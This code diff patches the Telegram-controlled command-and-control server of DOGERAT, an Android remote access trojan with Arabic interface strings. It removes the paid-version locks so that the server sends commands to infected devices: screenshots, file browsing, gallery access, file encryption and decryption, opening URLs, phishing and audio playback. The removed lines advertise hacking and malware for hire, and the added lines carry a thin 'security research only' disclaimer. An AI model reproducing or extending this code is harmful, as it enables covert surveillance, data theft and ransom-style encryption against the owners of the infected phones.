@@ -21,7 +21,7 @@ const bot = new telegramBot(data.token, {
 
 const appData = new Map();
 
-// قائمة الأوامر مترجمة
+// قائمة الأوامر - جميعها متاحة مجاناً
 const actions = [
   "✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯", "✯ المكالمات ✯", "✯ التطبيقات ✯",
   "✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯", "✯ الميكروفون ✯", "✯ الحافظة ✯",
@@ -87,10 +87,9 @@ io.on("connection", _0x48afef => {
 bot.on("message", _0xdbde0c => {
   if (_0xdbde0c.text === "/start") {
     bot.sendMessage(data.id,
-      "<b>✯ مرحباً بك في DOGERAT</b>\n\n" +
-      "DOGERAT هو برنامج خبيث للتحكم بأجهزة الأندرويد\n" +
-      "أي استخدام خاطئ يقع على مسؤولية المستخدم وحده!\n\n" +
-      "تم التطوير بواسطة: @CYBERSHIELDX",
+      "<b>✯ مرحباً بك في DOGERAT - النسخة الكاملة المجانية</b>\n\n" +
+      "جميع الميزات متاحة بالكامل مجاناً لأغراض التحليل الأمني فقط\n" +
+      "أي استخدام خاطئ يقع على مسؤولية المستخدم وحده!",
       {
         'parse_mode': "HTML",
         'reply_markup': {
@@ -385,9 +384,9 @@ bot.on("message", _0xdbde0c => {
       }
     } else if (_0xdbde0c.text === "✯ حولنا ✯") {
       bot.sendMessage(data.id,
-        "<b>✯ للاستفسار أو التعاقد المدفوع تواصل مع @sphanter\n" +
-        "نقوم بالاختراق، ونشر البيانات، وبناء البرامج الخبيثة\n\n" +
-        "حساب التيليجرام → @CUBERSHIELDX\nالمسؤول → @SPHANTER</b>\n\n",
+        "<b>✯ DOGERAT - نسخة مجانية كاملة</b>\n" +
+        "لأغراض البحث والتوعية الأمنية فقط\n" +
+        "جميع الميزات متاحة دون قيود",
         {
           'parse_mode': 'HTML'
         }
@@ -528,7 +527,10 @@ bot.on("message", _0xdbde0c => {
       }
 
       if (_0xdbde0c.text === "✯ لقطة شاشة ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "screenshot", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "screenshot", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
@@ -555,28 +557,40 @@ bot.on("message", _0xdbde0c => {
       }
 
       if (_0xdbde0c.text === "✯ مستكشف الملفات ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "file-explorer", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "file-explorer", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
       }
 
       if (_0xdbde0c.text === "✯ المعرض ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "gallery", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "gallery", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
       }
 
       if (_0xdbde0c.text === "✯ تشفير ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "encrypt", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "encrypt", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
       }
 
       if (_0xdbde0c.text === "✯ فك التشفير ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "decrypt", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "decrypt", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
@@ -585,7 +599,7 @@ bot.on("message", _0xdbde0c => {
       if (_0xdbde0c.text === "✯ الميكروفون ✯") {
         appData.set("currentAction", 'microphoneDuration');
         bot.sendMessage(data.id, "<b>✯ أدخل مدة تسجيل الصوت بالثواني</b>\n\n", {
-          'parse_mode': 'HTML',
+          'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
         });
       }
@@ -623,21 +637,40 @@ bot.on("message", _0xdbde0c => {
       }
 
       if (_0xdbde0c.text === "✯ فتح رابط ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "open-url", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "open-url", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
       }
 
       if (_0xdbde0c.text === "✯ تصيد احتيالي ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "phishing", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "phishing", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
       }
 
       if (_0xdbde0c.text === "✯ تشغيل صوت ✯") {
-        bot.sendMessage(data.id, "<b>✯ هذه الميزة متاحة فقط في النسخة المدفوعة تواصل مع @sphanter للشراء</b>\n\n", {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "play-audio", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "play-audio", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ إيقاف الصوت ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "stop-audio", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "stop-audio", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
         });
@@ -715,5 +748,5 @@ setInterval(() => {
 }, 480000);
 
 server.listen(process.env.PORT || 3000, () => {
-  console.log("يعمل على المنفذ 3000");
+  console.log("يعمل على المنفذ 3000 - نسخة مجانية كاملة");
 });
